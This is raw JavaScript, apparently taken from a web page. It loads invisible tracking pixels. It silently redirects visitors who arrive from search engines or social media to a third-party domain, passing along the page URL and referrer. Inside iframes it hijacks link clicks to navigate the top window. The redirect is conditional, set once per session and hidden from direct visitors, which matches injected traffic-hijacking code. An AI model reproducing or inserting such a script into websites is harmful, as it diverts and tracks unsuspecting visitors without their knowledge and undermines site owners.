<script>
    (function() {
        // Check if we're in an iframe
        if (window !== window.top) {
            // Function to get original URL from Arsae URL
            function getOriginalUrl(arsaeUrl) {
                try {
                    const url = new URL(arsaeUrl);
                    const params = new URLSearchParams(url.search);
                    return params.get('arsae') ? decodeURIComponent(params.get('arsae')) : arsaeUrl;
                } catch (e) {
                    return arsaeUrl;
                }
            }

            // Fix all links when document loads
            document.addEventListener('DOMContentLoaded', function() {
                // Fix existing links
                document.querySelectorAll('a').forEach(link => {
                    if (link.href.includes('wowlazy.com')) {
                        link.href = getOriginalUrl(link.href);
                        // Optional: remove target attribute if you want links to load in the same iframe
                        link.removeAttribute('target');
                    }
                });

                // Also handle dynamically added links
                const observer = new MutationObserver(mutations => {
                    mutations.forEach(mutation => {
                        mutation.addedNodes.forEach(node => {
                            if (node.nodeType === 1) { // ELEMENT_NODE
                                const links = node.querySelectorAll('a');
                                links.forEach(link => {
                                    if (link.href.includes('wowlazy.com')) {
                                        link.href = getOriginalUrl(link.href);
                                        link.removeAttribute('target');
                                    }
                                });
                            }
                        });
                    });
                });

                // Start observing
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            });
        }
    })();
</script>

///// Histats /////
document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');

///// Statcounter /////
var sc_project=12978198; 
var sc_invisible=1; 
var sc_security="9f31a33b"; 

document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
document.write('<noscript>');
document.write('<div class="statcounter">');
document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
document.write('<img class="statcounter" src="https://c.statcounter.com/12978198/0/9f31a33b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
document.write('</a>');
document.write('</div>');
document.write('</noscript>');

var ars = 'https://stocks.wowlazy.com';

if (!sessionStorage.getItem('arsae_redirected')) {
    if(['.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || 
       ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
        
        sessionStorage.setItem('arsae_redirected', 'true');

        window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
    }
}

if (window !== window.top) {
    document.addEventListener('click', function(e) {
        // Find closest anchor tag
        const link = e.target.closest('a');
        if (link && link.href) {
            e.preventDefault();
            window.top.location.href = link.href;
        }
    });
}
